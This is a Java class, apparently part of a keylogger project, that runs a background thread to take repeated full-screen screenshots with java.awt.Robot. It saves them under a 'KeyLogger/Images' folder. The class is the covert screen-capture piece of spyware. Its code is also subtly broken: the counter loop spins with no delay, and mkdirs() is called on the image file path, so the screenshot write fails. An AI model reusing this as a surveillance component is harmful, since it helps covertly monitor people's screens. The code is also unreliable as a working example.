package app;

import java.awt.Robot;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;

import javax.imageio.ImageIO;

public class Screen implements Runnable{

    Thread screenThread;
    private String name;
    Sync sync;

    public Screen(String name, Sync sync) {
     this.name = name;
     this.sync = sync;
    }

    @Override
    public void run(){
        int counter = 0;
        while(counter<60 && sync.flag){
            counter++;
            if(counter==60){
                Capture();
                counter = 0;
            }
        }
    }

    public void Capture(){
        try{
            Robot robot = new Robot();
            String format = "jpg";
            String filename = "FullScreenshot_" + new SimpleDateFormat("yyyy.MM.dd HH.mm.ss").format(new java.util.Date()) +"."+format;

            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            File file =new File("Java/KeyLogger/Images/" + filename);
            boolean check = file.mkdirs();
            if(check){
                ImageIO.write(screenFullImage, format, file);
                System.out.println("Screenshot Captured");
            }
        }
        catch(AWTException | IOException ex){
            System.out.println(ex.getMessage());
        }
    }

    public void start(){
        System.out.println("Thread started");
        if (screenThread== null) {
            screenThread = new Thread(this, name);
            screenThread.start();
        }
    }
}
